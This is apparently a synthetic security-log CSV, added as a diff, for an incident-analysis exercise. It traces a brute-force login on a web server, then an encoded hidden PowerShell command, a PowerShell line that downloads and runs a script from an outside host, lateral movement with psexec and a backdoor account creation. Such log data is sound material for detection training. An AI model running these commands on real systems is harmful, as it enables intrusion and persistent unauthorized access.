@@ -1,0 +1,30 @@
+Log_ID,Timestamp,Hostname,Event_ID,User,Source_IP,Destination,Log_Source,Event_Description,Process_CommandLine,Result,Severity
+L0001,2026-03-10 08:00:00,WS-01,4624,user1,10.0.1.10,,Windows Security,Inicio de sesión,,Success,Info
+L0002,2026-03-10 08:20:00,WS-02,4624,user2,10.0.1.11,,Windows Security,Inicio de sesión,,Success,Info
+L0003,2026-03-10 08:40:00,WS-03,4624,user3,10.0.1.12,,Windows Security,Inicio de sesión,,Success,Info
+L0004,2026-03-10 09:00:00,WS-04,4624,user4,10.0.1.13,,Windows Security,Inicio de sesión,,Success,Info
+L0005,2026-03-10 09:20:00,WS-01,4624,user1,10.0.1.10,,Windows Security,Inicio de sesión,,Success,Info
+L0006,2026-03-10 09:40:00,WS-02,4624,user2,10.0.1.11,,Windows Security,Inicio de sesión,,Success,Info
+L0007,2026-03-10 10:00:00,WS-03,4624,user3,10.0.1.12,,Windows Security,Inicio de sesión,,Success,Info
+L0008,2026-03-10 10:20:00,WS-04,4624,user4,10.0.1.13,,Windows Security,Inicio de sesión,,Success,Info
+L0009,2026-03-10 10:40:00,WS-01,4624,user1,10.0.1.10,,Windows Security,Inicio de sesión,,Success,Info
+L0010,2026-03-10 11:00:00,WS-02,4624,user2,10.0.1.11,,Windows Security,Inicio de sesión,,Success,Info
+L0011,2026-03-10 11:20:00,WS-03,4624,user3,10.0.1.12,,Windows Security,Inicio de sesión,,Success,Info
+L0012,2026-03-10 11:40:00,WS-04,4624,user4,10.0.1.13,,Windows Security,Inicio de sesión,,Success,Info
+L0013,2026-03-10 12:00:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0014,2026-03-10 12:01:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0015,2026-03-10 12:02:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0016,2026-03-10 12:03:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0017,2026-03-10 12:04:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0018,2026-03-10 12:05:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0019,2026-03-10 12:06:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0020,2026-03-10 12:07:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0021,2026-03-10 12:08:00,SRV-WEB01,4625,admin,185.220.101.45,,Windows Security,Inicio de sesión fallido,,Failure,Medium
+L0022,2026-03-10 12:10:00,SRV-WEB01,4624,admin,185.220.101.45,,Windows Security,Inicio de sesión exitoso,,Success,High
+L0023,2026-03-10 12:13:00,SRV-WEB01,4104,admin,185.220.101.45,,PowerShell,Script block,powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA,Success,Critical
+L0024,2026-03-10 12:16:00,SRV-WEB01,4688,admin,185.220.101.45,,Sysmon,Proceso creado,powershell IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1'),Success,Critical
+L0025,2026-03-10 12:22:00,SRV-APP01,4624,admin,10.0.2.15,,Windows Security,Inicio de sesión de red,,Success,High
+L0026,2026-03-10 12:25:00,SRV-DB01,4624,admin,10.0.2.15,,Windows Security,Inicio de sesión de red,,Success,High
+L0027,2026-03-10 12:28:00,SRV-FILE01,4624,admin,10.0.2.15,,Windows Security,Inicio de sesión de red,,Success,High
+L0028,2026-03-10 12:32:00,SRV-DB01,4688,admin,10.0.2.15,,Sysmon,Proceso creado,psexec \\SRV-DB01 -s cmd.exe,Success,High
+L0029,2026-03-10 12:35:00,SRV-DB01,4720,admin,10.0.2.15,,Windows Security,Cuenta creada,net user svc_backup P@ss /add,Success,Critical
